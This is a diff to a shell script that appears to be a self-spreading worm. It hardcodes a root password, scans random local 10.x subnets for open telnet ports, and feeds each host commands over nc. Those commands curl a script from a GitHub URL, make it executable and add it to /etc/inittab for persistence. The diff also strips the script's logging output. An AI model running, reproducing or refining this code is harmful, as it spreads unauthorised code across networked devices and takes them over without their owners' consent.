@@ -1,6 +1,6 @@
 #!/bin/sh
 
-# set non-blank password
+# set non-blank root password
 ( sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ) | passwd
 
 MYSUBNET=`busybox route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
@@ -16,34 +16,28 @@ talk() {
   echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
   echo -n 'chmod +x $J ;'
   echo -n 'echo ttyS2::respawn:-$J >> /etc/inittab ;'
-  echo 'kill -HUP 1'
+  echo -n 'kill -HUP 1 ;'
+  echo 'exit'
   sleep 30
 }
 
 connectTo() {
-  echo connecting to $1:23 >&2
   talk | timeout -t 60 nc $1 23
 }
 
 sweep() {
-  cd `mktemp -d`
-  if [ -z "$1" ] ; then
-    N=$RANDOM
-    let "N %= 256"
-    SCAN=$MYSUBNET.$N.0/24
-  else
-    SCAN="$1"
-    N=test
-  fi
-  echo scanning $SCAN:23 >&2
-  nmap -p 23 -T $NMAPTIMING --open -oG hosts_$N $SCAN >/dev/null 2>&1
-  sed -En -i 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' hosts_$N
-  for H in `cat hosts_$N` ; do connectTo $H ; done
-  G=`pwd` ; cd ; rm -r $G
+  O=`mktemp`
+  N=$RANDOM
+  let "N %= 256"
+  SCAN=$MYSUBNET.$N.0/24
+  nmap -p 23 -T $NMAPTIMING --open -oG $O $SCAN >/dev/null 2>&1
+  for H in `sed -En 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' < $O`
+    do connectTo $H
+  done
+  rm $O
 }
 
 if [ -z "$1" ] ; then
-  echo scanning subnet $MYSUBNET.0.0/16 >&2
   while true ; do sweep ; done
 else
   connectTo $1
